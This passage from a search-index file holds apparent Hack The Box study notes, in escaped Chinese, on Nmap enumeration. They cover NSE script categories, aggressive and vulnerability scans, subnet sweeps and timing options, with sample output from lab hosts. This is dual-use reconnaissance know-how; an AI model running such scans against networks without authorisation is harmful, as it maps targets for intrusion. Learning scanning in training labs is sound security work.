\u4f7f\u7528\u5916\u90e8\u670d\u52a1\u8fdb\u884c\u8fdb\u4e00\u6b65\u5904\u7406\u7684\u811a\u672c\u3002 <code>fuzzer</code> \u8fd9\u4f7f\u7528\u811a\u672c\u901a\u8fc7\u53d1\u9001\u4e0d\u540c\u7684\u5b57\u6bb5\u6765\u8bc6\u522b\u6f0f\u6d1e\u548c\u610f\u5916\u6570\u636e\u5305\u5904\u7406\uff0c\u8fd9\u53ef\u80fd\u4f1a\u82b1\u8d39\u5f88\u591a\u65f6\u95f4\u3002 <code>intrusive</code> \u53ef\u80fd\u5bf9\u76ee\u6807\u7cfb\u7edf\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\u7684\u4fb5\u5165\u6027\u811a\u672c\u3002 <code>malware</code> \u68c0\u67e5\u67d0\u4e9b\u6076\u610f\u8f6f\u4ef6\u662f\u5426\u611f\u67d3\u4e86\u76ee\u6807\u7cfb\u7edf\u3002 <code>safe</code> \u4e0d\u6267\u884c\u4fb5\u5165\u6027\u548c\u7834\u574f\u6027\u8bbf\u95ee\u7684\u9632\u5fa1\u811a\u672c\u3002 <code>version</code> \u670d\u52a1\u68c0\u6d4b\u6269\u5c55\u3002 <code>vuln</code> \u7279\u5b9a\u6f0f\u6d1e\u7684\u8bc6\u522b\u3002 <p>\u6211\u4eec\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5728<code>Nmap</code>.</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_23","title":"\u9ed8\u8ba4\u811a\u672c","text":"<p>\u9ed8\u8ba4\u811a\u672c</p> <pre><code>darkinga@htb[/htb]$ sudo nmap &lt;target&gt; -sC\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_24","title":"\u7279\u5b9a\u811a\u672c\u7c7b\u522b","text":"<p>\u7279\u5b9a\u811a\u672c\u7c7b\u522b</p> <pre><code>darkinga@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;category&gt;\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_25","title":"\u5b9a\u4e49\u811a\u672c","text":"<p>\u5b9a\u4e49\u811a\u672c</p> <pre><code>darkinga@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;,...\n</code></pre> <p>\u4f8b\u5982\uff0c\u8ba9\u6211\u4eec\u7ee7\u7eed\u4f7f\u7528\u76ee\u6807 SMTP \u7aef\u53e3\u5e76\u67e5\u770b\u6211\u4eec\u4f7f\u7528\u4e24\u4e2a\u5b9a\u4e49\u7684\u811a\u672c\u83b7\u5f97\u7684\u7ed3\u679c\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-_1","title":"Nmap - \u6307\u5b9a\u811a\u672c","text":"<p>Nmap - \u6307\u5b9a\u811a\u672c</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 23:21 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.050s latency).\n\nPORT   STATE SERVICE\n25/tcp open  smtp\n|_banner: 220 inlane ESMTP Postfix (Ubuntu)\n|_smtp-commands: inlane, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 25</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--script banner,smtp-commands</code> \u4f7f\u7528\u6307\u5b9a\u7684 NSE \u811a\u672c\u3002 <p>\u6211\u4eec\u770b\u5230\u4f7f\u7528'banner'\u811a\u672c\u53ef\u4ee5\u8bc6\u522bLinux\u7684Ubuntu\u53d1\u884c\u7248\u3002\u8be5<code>smtp-commands</code>\u811a\u672c\u5411\u6211\u4eec\u5c55\u793a\u4e86\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0e\u76ee\u6807 SMTP \u670d\u52a1\u5668\u4ea4\u4e92\u6765\u4f7f\u7528\u54ea\u4e9b\u547d\u4ee4\u3002\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u6b64\u7c7b\u4fe1\u606f\u53ef\u80fd\u4f1a\u5e2e\u52a9\u6211\u4eec\u627e\u51fa\u76ee\u6807\u4e0a\u7684\u73b0\u6709\u7528\u6237\u3002<code>Nmap</code>\u8fd8\u4f7f\u6211\u4eec\u80fd\u591f\u4f7f\u7528\u653b\u51fb\u6027\u9009\u9879 ( <code>-A</code>) \u626b\u63cf\u6211\u4eec\u7684\u76ee\u6807\u3002\u8fd9\u4f1a\u4f7f\u7528\u591a\u4e2a\u9009\u9879\u626b\u63cf\u76ee\u6807\uff0c\u5982\u670d\u52a1\u68c0\u6d4b ( <code>-sV</code>)\u3001\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b ( <code>-O</code>)\u3001\u8ddf\u8e2a\u8def\u7531 ( <code>--traceroute</code>) \u548c\u9ed8\u8ba4 NSE \u811a\u672c ( <code>-sC</code>)\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-_2","title":"Nmap - \u653b\u51fb\u6027\u626b\u63cf","text":"<p>Nmap - \u653b\u51fb\u6027\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -A\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:38 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.012s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: WordPress 5.3.4\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: blog.inlanefreight.com\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), \nAXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), \nLinux 2.6.32 - 2.6.35 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT      ADDRESS\n1   11.91 ms 10.129.2.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.36 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 25</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-A</code> \u6267\u884c\u670d\u52a1\u68c0\u6d4b\u3001\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u3001\u8def\u7531\u8ddf\u8e2a\u5e76\u4f7f\u7528\u9ed8\u8ba4\u811a\u672c\u626b\u63cf\u76ee\u6807\u3002 <p>\u501f\u52a9\u4f7f\u7528\u7684\u626b\u63cf\u9009\u9879 ( )\uff0c\u6211\u4eec\u627e\u51fa\u4e86\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u662f<code>-A</code>\u54ea\u79cd Web \u670d\u52a1\u5668 ( )\uff0c\u4f7f\u7528\u4e86\u54ea\u4e2a Web \u5e94\u7528\u7a0b\u5e8f ( )\uff0c\u4ee5\u53ca\u7f51\u9875\u7684\u6807\u9898 ( )\u3002\u6b64\u5916\uff0c\u8868\u660e\u5b83\u5f88\u53ef\u80fd\u662f( ) \u64cd\u4f5c\u7cfb\u7edf\u3002<code>Apache 2.4.29``WordPress 5.3.4``blog.inlanefreight.com``Nmap``Linux``96%</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_26","title":"\u6f0f\u6d1e\u8bc4\u4f30","text":"<p>\u73b0\u5728\u8ba9\u6211\u4eec\u8f6c\u5230 HTTP \u7aef\u53e3 80\uff0c\u770b\u770b\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>vuln</code>\u6765\u81ea\u7684\u7c7b\u522b\u627e\u5230\u54ea\u4e9b\u4fe1\u606f\u548c\u6f0f\u6d1e<code>NSE</code>\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-_3","title":"Nmap - \u6f0f\u6d1e\u7c7b\u522b","text":"<p>Nmap - \u6f0f\u6d1e\u7c7b\u522b</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sV --script vuln \n\nNmap scan report for 10.129.2.28\nHost is up (0.036s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-enum:\n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2\n|   /: WordPress version: 5.3.4\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|   /wp-login.php: Wordpress login page.\n|   /wp-admin/upgrade.php: Wordpress login page.\n|_  /readme.html: Interesting, a readme.\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-wordpress-users:\n| Username found: admin\n|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'\n| vulners:\n|   cpe:/a:apache:http_server:2.4.29:\n|       CVE-2019-0211   7.2 https://vulners.com/cve/CVE-2019-0211\n|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312\n|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715\n&lt;SNIP&gt;\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 80</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>--script vuln</code> \u4f7f\u7528\u6307\u5b9a\u7c7b\u522b\u4e2d\u7684\u6240\u6709\u76f8\u5173\u811a\u672c\u3002 <p>\u7528\u4e8e\u4e0a\u6b21\u626b\u63cf\u7684\u811a\u672c\u4e0e\u7f51\u7edc\u670d\u52a1\u5668\u53ca\u5176\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\uff0c\u4ee5\u67e5\u627e\u6709\u5173\u5176\u7248\u672c\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u5e76\u68c0\u67e5\u5404\u79cd\u6570\u636e\u5e93\u4ee5\u67e5\u770b\u662f\u5426\u5b58\u5728\u5df2\u77e5\u6f0f\u6d1e\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u627e\u5230\u6709\u5173 NSE \u811a\u672c\u548c\u76f8\u5e94\u7c7b\u522b\u7684\u66f4\u591a\u4fe1\u606f\uff1a https: //nmap.org/nsedoc/index.html</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_27","title":"\u8868\u73b0","text":"<p>\u5f53\u6211\u4eec\u9700\u8981\u626b\u63cf\u5e7f\u6cdb\u7684\u7f51\u7edc\u6216\u5904\u7406\u4f4e\u7f51\u7edc\u5e26\u5bbd\u65f6\uff0c\u626b\u63cf\u6027\u80fd\u8d77\u7740\u91cd\u8981\u4f5c\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u9009\u9879\u6765\u5224\u65ad\u6d4b\u8bd5\u6570\u636e\u5305\u5e94\u8be5<code>Nmap</code>\u6709\u591a\u5feb ( <code>-T &lt;1-5&gt;</code>)\u3001\u9891\u7387 ( <code>--min-parallelism &lt;number&gt;</code>)\u3001\u8d85\u65f6 ( <code>--max-rtt-timeout &lt;time&gt;</code>)\u3001\u5e94\u8be5\u540c\u65f6\u53d1\u9001\u591a\u5c11\u6570\u636e\u5305 ( ) \u4ee5\u53ca\u88ab\u626b\u63cf\u7aef\u53e3\u7684<code>--min-rate &lt;number&gt;</code>\u91cd\u8bd5\u6b21\u6570 ( )<code>--max-retries &lt;number&gt;</code>\u5e94\u8be5\u626b\u63cf\u76ee\u6807\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_28","title":"\u8d85\u65f6","text":"<p>\u5f53 Nmap \u53d1\u9001\u6570\u636e\u5305\u65f6\uff0c\u9700\u8981\u4e00\u4e9b\u65f6\u95f4 ( <code>Round-Trip-Time</code>- <code>RTT</code>) \u624d\u80fd\u4ece\u626b\u63cf\u7684\u7aef\u53e3\u63a5\u6536\u5230\u54cd\u5e94\u3002\u901a\u5e38\uff0c<code>Nmap</code>\u4ee5 100 \u6beb\u79d2\u7684\u9ad8\u8d85\u65f6 ( <code>--min-RTT-timeout</code>) \u5f00\u59cb\u3002\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b\uff0c\u626b\u63cf\u5177\u6709 256 \u53f0\u4e3b\u673a\u7684\u6574\u4e2a\u7f51\u7edc\uff0c\u5305\u62ec\u524d 100 \u4e2a\u7aef\u53e3\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_29","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#rtt","title":"\u4f18\u5316 RTT","text":"<p>\u4f18\u5316 RTT</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>--initial-rtt-timeout 50ms</code> \u5c06\u6307\u5b9a\u7684\u65f6\u95f4\u503c\u8bbe\u7f6e\u4e3a\u521d\u59cb RTT \u8d85\u65f6\u3002 <code>--max-rtt-timeout 100ms</code> \u5c06\u6307\u5b9a\u7684\u65f6\u95f4\u503c\u8bbe\u7f6e\u4e3a\u6700\u5927 RTT \u8d85\u65f6\u3002 <p>\u6bd4\u8f83\u4e24\u6b21\u626b\u63cf\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4f18\u5316\u626b\u63cf\u5c11\u627e\u5230\u4e24\u53f0\u4e3b\u673a\uff0c\u4f46\u626b\u63cf\u53ea\u7528\u4e86\u56db\u5206\u4e4b\u4e00\u7684\u65f6\u95f4\u3002\u7531\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u51fa\u7ed3\u8bba\uff0c\u5c06\u521d\u59cb RTT \u8d85\u65f6 ( <code>--initial-rtt-timeout</code>) \u8bbe\u7f6e\u5f97\u592a\u77ed\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6211\u4eec\u5ffd\u7565\u4e3b\u673a\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_30","title":"\u6700\u5927\u91cd\u8bd5\u6b21\u6570","text":"<p>\u53e6\u4e00\u79cd\u63d0\u9ad8\u626b\u63cf\u901f\u5ea6\u7684\u65b9\u6cd5\u662f\u6307\u5b9a\u53d1\u9001\u6570\u636e\u5305\u7684\u91cd\u8bd5\u7387 ( <code>--max-retries</code>)\u3002\u91cd\u8bd5\u7387\u7684\u9ed8\u8ba4\u503c\u4e3a<code>10</code>\uff0c\u56e0\u6b64\u5982\u679c<code>Nmap</code>\u6ca1\u6709\u6536\u5230\u7aef\u53e3\u7684\u54cd\u5e94\uff0c\u5b83\u5c06\u4e0d\u518d\u5411\u8be5\u7aef\u53e3\u53d1\u9001\u4efb\u4f55\u6570\u636e\u5305\u5e76\u5c06\u88ab\u8df3\u8fc7\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_31","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_32","title":"\u51cf\u5c11\u91cd\u8bd5","text":"<p>\u51cf\u5c11\u91cd\u8bd5</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep \"/tcp\" | wc -l\n\n21\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>--max-retries 0</code> \u8bbe\u7f6e\u5c06\u5728\u626b\u63cf\u671f\u95f4\u6267\u884c\u7684\u91cd\u8bd5\u6b21\u6570\u3002 <p>\u540c\u6837\uff0c\u6211\u4eec\u8ba4\u8bc6\u5230\u52a0\u901f\u4e5f\u4f1a\u5bf9\u6211\u4eec\u7684\u7ed3\u679c\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u80fd\u4f1a\u5ffd\u7565\u91cd\u8981\u4fe1\u606f\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_33","title":"\u8d39\u7387","text":"<p>\u5728\u767d\u76d2\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u83b7\u5f97\u5b89\u5168\u7cfb\u7edf\u7684\u767d\u540d\u5355\uff0c\u4ee5\u68c0\u67e5\u7f51\u7edc\u4e2d\u7684\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u6d4b\u8bd5\u4fdd\u62a4\u63aa\u65bd\u3002\u5982\u679c\u6211\u4eec\u77e5\u9053\u7f51\u7edc\u5e26\u5bbd\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53d1\u9001\u6570\u636e\u5305\u7684\u901f\u7387\uff0c\u8fd9\u4f1a\u663e\u7740\u52a0\u5feb\u6211\u4eec\u4f7f\u7528<code>Nmap</code>. \u5728\u8bbe\u7f6e\u53d1\u9001\u6570\u636e\u5305\u7684\u6700\u5c0f\u901f\u7387 ( <code>--min-rate &lt;number&gt;</code>) \u65f6\uff0c\u6211\u4eec\u544a\u8bc9<code>Nmap</code>\u540c\u65f6\u53d1\u9001\u6307\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5305\u3002\u5b83\u5c06\u5c1d\u8bd5\u76f8\u5e94\u5730\u7ef4\u6301\u901f\u7387\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_34","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_35","title":"\u4f18\u5316\u626b\u63cf","text":"<p>\u4f18\u5316\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>-oN tnet.minrate300</code> \u4ee5\u666e\u901a\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\uff0c\u4ece\u6307\u5b9a\u7684\u6587\u4ef6\u540d\u5f00\u59cb\u3002 <code>--min-rate 300</code> \u8bbe\u7f6e\u5c06\u540c\u65f6\u53d1\u9001\u7684\u6570\u636e\u5305\u6570\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-","title":"\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3","text":"<p>\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-_1","title":"\u4f18\u5316\u626b\u63cf - \u627e\u5230\u5f00\u653e\u7aef\u53e3","text":"<p>\u4f18\u5316\u626b\u63cf - \u627e\u5230\u5f00\u653e\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.minrate300 | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_36","title":"\u5b9a\u65f6","text":"<p>\u56e0\u4e3a\u8fd9\u6837\u7684\u8bbe\u7f6e\u4e0d\u80fd\u603b\u662f\u624b\u52a8\u4f18\u5316\uff0c\u5c31\u50cf\u5728\u9ed1\u76d2\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4e00\u6837\uff0c<code>Nmap</code>\u63d0\u4f9b\u4e86\u516d\u79cd\u4e0d\u540c\u7684\u65f6\u95f4\u6a21\u677f ( <code>-T &lt;0-5&gt;</code>) \u4f9b\u6211\u4eec\u4f7f\u7528\u3002\u8fd9\u4e9b\u503c ( <code>0-5</code>) \u51b3\u5b9a\u4e86\u6211\u4eec\u626b\u63cf\u7684\u79ef\u6781\u6027\u3002\u5982\u679c\u626b\u63cf\u8fc7\u4e8e\u6fc0\u8fdb\uff0c\u8fd9\u4e5f\u4f1a\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\uff0c\u5e76\u4e14\u5b89\u5168\u7cfb\u7edf\u53ef\u80fd\u4f1a\u7531\u4e8e\u4ea7\u751f\u7684\u7f51\u7edc\u6d41\u91cf\u800c\u963b\u6b62\u6211\u4eec\u3002\u5f53\u6211\u4eec\u6ca1\u6709\u5b9a\u4e49\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9\u65f6\u4f7f\u7528\u7684\u9ed8\u8ba4\u65f6\u5e8f\u6a21\u677f\u662f\u6b63\u5e38\u7684 ( <code>-T 3</code>)\u3002</p> <ul> <li><code>-T 0</code> / <code>-T paranoid</code></li> <li><code>-T 1</code>/<code>-T sneaky</code></li> <li><code>-T 2</code>/<code>-T polite</code></li> <li><code>-T 3</code>/<code>-T normal</code></li> <li><code>-T 4</code>/<code>-T aggressive</code></li> <li><code>-T 5</code>/<code>-T insane</code></li> </ul> <p>\u8fd9\u4e9b\u6a21\u677f\u5305\u542b\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u7684\u9009\u9879\uff0c\u5e76\u4e14\u5df2\u7ecf\u770b\u5230\u4e86\u5176\u4e2d\u7684\u4e00\u4e9b\u3002\u5f00\u53d1\u4eba\u5458\u6839\u636e\u5176\u6700\u4f73\u7ed3\u679c\u786e\u5b9a\u4e3a\u8fd9\u4e9b\u6a21\u677f\u8bbe\u7f6e\u7684\u503c\uff0c\u4f7f\u6211\u4eec\u66f4\u5bb9\u6613\u4f7f\u6211\u4eec\u7684\u626b\u63cf\u9002\u5e94\u76f8\u5e94\u7684\u7f51\u7edc\u73af\u5883\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\u786e\u5207\u4f7f\u7528\u7684\u9009\u9879\u53ca\u5176\u503c\uff1ahttps ://nmap.org/book/performance-timing-templates.html</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_37","title":"\u9ed8\u8ba4\u626b\u63cf","text":"<p>\u9ed8\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default \n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 32.44 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_38","title":"\u75af\u72c2\u626b\u63cf","text":"<p>\u75af\u72c2\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 18.07 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.0/24</code> \u626b\u63cf\u6307\u5b9a\u7684\u76ee\u6807\u7f51\u7edc\u3002 <code>-F</code> \u626b\u63cf\u524d 100 \u4e2a\u7aef\u53e3\u3002 <code>-oN tnet.T5</code> \u4ee5\u666e\u901a\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\uff0c\u4ece\u6307\u5b9a\u7684\u6587\u4ef6\u540d\u5f00\u59cb\u3002 <code>-T 5</code> \u6307\u5b9a\u75af\u72c2\u8ba1\u65f6\u6a21\u677f\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-_2","title":"\u9ed8\u8ba4\u626b\u63cf - 